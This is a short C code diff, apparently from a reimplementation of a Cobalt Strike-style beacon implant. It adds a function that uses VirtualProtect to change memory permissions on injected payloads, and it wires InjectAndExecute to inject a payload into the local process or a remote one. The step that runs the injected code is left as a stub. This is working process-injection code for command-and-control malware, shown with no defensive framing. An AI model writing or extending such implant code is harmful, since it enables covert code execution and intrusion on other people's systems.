@@ -164,6 +164,22 @@ char* InjectRemotely(INJECTION* injection, const char* payload, int size)
 	return NULL;
 }
 
+BOOL AdjustMemoryPermissions(char* payload, int size) {
+	if(S_PROCINJ_PERMS_I == S_PROCINJ_PERMS)
+		return TRUE;
+
+	DWORD flOldProtect;
+	if (!VirtualProtect(payload, size, S_PROCINJ_PERMS, &flOldProtect))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not adjust permissions in process: %s", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_ADJUST_PERMISSIONS_FAILED, lastError);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
 char* InjectLocally(char* payload, int size)
 {
 	int dwSize = S_PROCINJ_MINALLOC;
@@ -191,9 +207,18 @@ char* InjectLocally(char* payload, int size)
 	return NULL;
 }
 
-void InjectAndExecute(INJECTION* injection, char* payload, int pLen, int pOffset, char* parameter)
+void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
 {
-	LTODO("Implement InjectAndExecute");
+	char* target;
+	if(injection->isSamePid)
+		target = InjectLocally(payload, size);
+	else
+		target = InjectRemotely(injection, payload, size);
+
+	if (!target)
+		return;
+
+	LTODO("Implement ExecuteInjection");
 	return;
 }
 
